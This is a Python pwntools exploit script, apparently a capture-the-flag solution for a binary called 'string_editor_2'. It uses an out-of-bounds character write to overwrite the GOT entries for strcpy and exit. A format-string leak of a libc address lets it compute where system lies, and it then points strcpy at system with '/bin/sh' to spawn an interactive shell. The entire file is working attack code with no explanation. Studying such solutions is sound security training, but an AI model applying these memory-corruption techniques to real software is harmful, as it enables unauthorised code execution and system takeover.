from pwn import *

elf = ELF("./string_editor_2")
libc = ELF("./libc.so.6")

script = '\n'.join([
#    "break main",
#    "break *0x40091d",
#    "break del",
    "continue",
    ])

addr_target = 0x601080
ret = 0x4005ce
addr_strcpy_got = elf.got['strcpy']
addr_exit_got = elf.got['exit']

#p = gdb.debug(elf.path,gdbscript=script)
p = process(elf.path)


# got(strcpy) <- plt(printf)
for i in range(8):
    p.recvuntil("What character would you like to edit? (enter in 15 to see utils)")
    p.sendline(str(addr_strcpy_got - addr_target + i) )
    
    p.recvuntil("What character should be in that index?")
    p.sendline( chr(p64(elf.plt['printf'])[i]) )

# got(exit) <- ret;
for i in range(8):
    p.recvuntil("What character would you like to edit? (enter in 15 to see utils)")
    p.sendline(str(addr_exit_got - addr_target + i) )
    
    p.recvuntil("What character should be in that index?")
    p.sendline( chr(p64(ret)[i]) )

# fsb(leak __libc_stat_main+243)
# printf("%13$p**********")
# target <- "%13$p"
for i in range(len("%13$p")):
    p.recvuntil("What character would you like to edit? (enter in 15 to see utils)")
    p.sendline(str(i))
    
    p.recvuntil("What character should be in that index?")
    p.sendline("%13$p"[i] )

# calc system address
p.recvuntil("What character would you like to edit? (enter in 15 to see utils)")
p.sendline("15")
p.recvuntil("3. Exit")
p.sendline("2")
addr___libc_start_main = int((p.recvuntil("*"))[:-1].decode(),16) - 243
log.info("addr___libc_start_main = " + hex(addr___libc_start_main))
addr_libc_base = addr___libc_start_main - libc.symbols['__libc_start_main']
addr_system = addr_libc_base + libc.symbols['system']
log.info("addr_system = " + hex(addr_system))

# got(strcpy) <- system
for i in range(8):
    p.recvuntil("What character would you like to edit? (enter in 15 to see utils)")
    p.sendline(str(addr_strcpy_got - addr_target + i) )
    
    p.recvuntil("What character should be in that index?")
    p.sendline( chr(p64(addr_system)[i]) )

# target <- "/bin/sh\x00*******"
for i in range(len("/bin/sh")):
    p.recvuntil("What character would you like to edit? (enter in 15 to see utils)")
    p.sendline(str(i))
    
    p.recvuntil("What character should be in that index?")
    p.sendline("/bin/sh"[i] )

p.recvuntil("What character would you like to edit? (enter in 15 to see utils)")
p.sendline("7")
p.recvuntil("What character should be in that index?")
p.sendline(b"\x00")

# system("/bin/sh\x00")
p.recvuntil("What character would you like to edit? (enter in 15 to see utils)")
p.sendline("15")
p.recvuntil("3. Exit")
p.sendline("2")

p.interactive()
